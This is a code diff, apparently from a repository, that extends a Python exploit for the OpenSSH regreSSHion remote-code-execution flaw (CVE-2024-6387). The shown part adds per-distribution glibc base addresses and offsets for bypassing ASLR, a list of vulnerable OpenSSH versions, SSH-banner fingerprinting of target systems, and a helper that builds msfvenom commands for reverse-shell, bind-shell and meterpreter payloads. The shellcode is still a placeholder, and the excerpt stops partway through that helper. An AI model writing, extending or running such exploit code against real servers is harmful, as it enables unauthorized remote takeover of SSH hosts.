@@ -1,0 +1,119 @@
+@@ -34,188 +34,285 @@
+ #         state, federal, and international laws.
+ #
+ # =============================================================================
+-"""
+-CVE-2024-6387 (regreSSHion) Exploit - Python Implementation
+-OpenSSH Remote Code Execution via Race Condition
+-"""
+ 
+ import socket
+ import struct
+ import time
+ import sys
+ import argparse
+-from typing import Optional, Tuple
+-import select
++from typing import Optional, Tuple, List
++from multiprocessing import Process, Queue, Value
++from threading import Thread
++import queue as queue_module
++
++# ============================================================================
++# CONSTANTS AND CONFIGURATION
++# ============================================================================
+ 
+-# Constants
+ MAX_PACKET_SIZE = 256 * 1024
+ LOGIN_GRACE_TIME = 120
+-MAX_STARTUPS = 100
+ CHUNK_ALIGN = lambda s: (s + 15) & ~15
+ 
+-# Possible glibc base addresses for ASLR bypass
+-GLIBC_BASES = [0xb7200000, 0xb7400000]
+-
+-# Shellcode placeholder (replace with actual payload)
++# Glibc base addresses for different systems
++GLIBC_BASES = {
++    'ubuntu_18_04': [0xb7200000, 0xb7400000, 0xb7600000],
++    'ubuntu_20_04': [0xb7000000, 0xb7200000, 0xb7400000],
++    'ubuntu_22_04': [0xb6e00000, 0xb7000000, 0xb7200000],
++    'debian_10': [0xb7100000, 0xb7300000, 0xb7500000],
++    'debian_11': [0xb6f00000, 0xb7100000, 0xb7300000],
++    'default': [0xb7200000, 0xb7400000, 0xb7600000, 0xb6e00000]
++}
++
++# Glibc offsets for exploitation
++GLIBC_OFFSETS = {
++    'ubuntu_20_04': {
++        'io_wfile_jumps': 0x21ba00,
++        'codecvt': 0x21dab8,
++    },
++    'ubuntu_22_04': {
++        'io_wfile_jumps': 0x21c740,
++        'codecvt': 0x21e7f8,
++    },
++    'default': {
++        'io_wfile_jumps': 0x21b740,
++        'codecvt': 0x21d7f8,
++    }
++}
++
++# Shellcode placeholder - replace with actual payload
+ SHELLCODE = b"\x90" * 4
+ 
++# Vulnerable OpenSSH versions
++VULNERABLE_VERSIONS = [
++    'OpenSSH_8.5', 'OpenSSH_8.6', 'OpenSSH_8.7', 'OpenSSH_8.8',
++    'OpenSSH_8.9', 'OpenSSH_9.0', 'OpenSSH_9.1', 'OpenSSH_9.2',
++    'OpenSSH_9.3', 'OpenSSH_9.4', 'OpenSSH_9.5', 'OpenSSH_9.6',
++    'OpenSSH_9.7'
++]
++
++
++# ============================================================================
++# UTILITY FUNCTIONS
++# ============================================================================
++
++def identify_os_from_banner(banner: str) -> str:
++    """Identify target OS from SSH banner"""
++    if 'Ubuntu' in banner:
++        if 'Ubuntu-3ubuntu' in banner or '22.04' in banner:
++            return 'ubuntu_22_04'
++        elif 'Ubuntu-1ubuntu' in banner or '20.04' in banner:
++            return 'ubuntu_20_04'
++        return 'ubuntu_20_04'
++    elif 'Debian' in banner:
++        if '11' in banner:
++            return 'debian_11'
++        return 'debian_10'
++    return 'default'
++
++
++def is_vulnerable_version(banner: str) -> Tuple[bool, str]:
++    """Check if SSH version is vulnerable"""
++    for version in VULNERABLE_VERSIONS:
++        if version in banner:
++            return True, version
++    return False, banner
++
++
++def get_glibc_bases(os_type: str) -> List[int]:
++    """Get glibc base addresses for OS type"""
++    return GLIBC_BASES.get(os_type, GLIBC_BASES['default'])
++
++
++def get_glibc_offsets(os_type: str) -> dict:
++    """Get glibc offsets for OS type"""
++    return GLIBC_OFFSETS.get(os_type, GLIBC_OFFSETS['default'])
++
++
++def generate_msfvenom_command(lhost: str, lport: int, payload_type: str = 'reverse_shell') -> str:
++    """Generate msfvenom command for payload creation"""
++    if payload_type == 'reverse_shell':
++        return f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f python -v SHELLCODE"
++    elif payload_type == 'bind_shell':
++        return f"msfvenom -p linux/x64/shell_bind_tcp LPORT={lport} -f python -v SHELLCODE"
++    elif payload_type == 'meterpreter':
++        return f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f python -v SHELLCODE"
++    else:
